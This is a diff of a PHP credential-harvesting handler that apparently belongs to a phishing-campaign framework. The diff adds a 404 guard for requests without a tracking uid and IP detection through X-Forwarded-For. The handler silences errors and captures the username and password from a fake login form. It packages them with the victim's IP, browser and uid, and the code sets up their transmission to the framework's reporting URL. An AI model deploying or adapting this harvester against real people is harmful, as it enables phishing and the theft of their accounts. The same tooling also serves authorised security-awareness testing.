@@ -2,6 +2,30 @@
 // Turn off all error reporting
 error_reporting(0);
 
+if (isset($_GET['uid'])) {
+  $uid = $_GET['uid'];
+  } else {
+    header('404 Not Found', true, 404);
+    echo "404 Page Not Found";
+    exit();
+  }
+
+function get_ip() {
+    if (function_exists('apache_request_headers')) {
+      $headers = apache_request_headers();
+    } else {
+      $headers = $_SERVER;
+    }
+    if (array_key_exists('X-Forwarded-For',$headers) && filter_var($headers['X-Forwarded-For'],FILTER_VALIDATE_IP,FILTER_FLAG_IPV4)) {
+      $the_ip = $headers['X-Forwarded-For'];
+    } elseif (array_key_exists('HTTP_X_FORWARDED_FOR',$headers) && filter_var($headers['HTTP_X_FORWARDED_FOR'],FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
+      $the_ip = $headers['HTTP_X_FORWARDED_FOR'];
+    } else {
+      $the_ip = filter_var($_SERVER['REMOTE_ADDR'],FILTER_VALIDATE_IP,FILTER_FLAG_IPV4);
+    }
+    return $the_ip;
+  }
+
 $password = $_POST['PasswordForm'];
 $username = $_POST['UsernameForm'];
 
@@ -9,11 +33,10 @@ if ($password != '') {
   $creds = 'user:' . $username . ' password:' . $password;
 }
 
-$uid = $_GET['uid'];
-$ip = $_SERVER['REMOTE_ADDR'];
+$ip = get_ip();
 $browser = $_SERVER['HTTP_USER_AGENT'];
 $host = $_SERVER['HTTP_HOST'];
-$url = "<%= PhishingFramework::SITE_URL %>" . '/reports/results/';
+$url = "<%= GlobalSettings.first.site_url %>" . '/reports/results/';
 $data = array('uid' => $uid, 'browser_info' => $browser, 'ip_address' => $ip, 'extra' => $creds);
 
 // use key 'http' even if you send the request to https://...
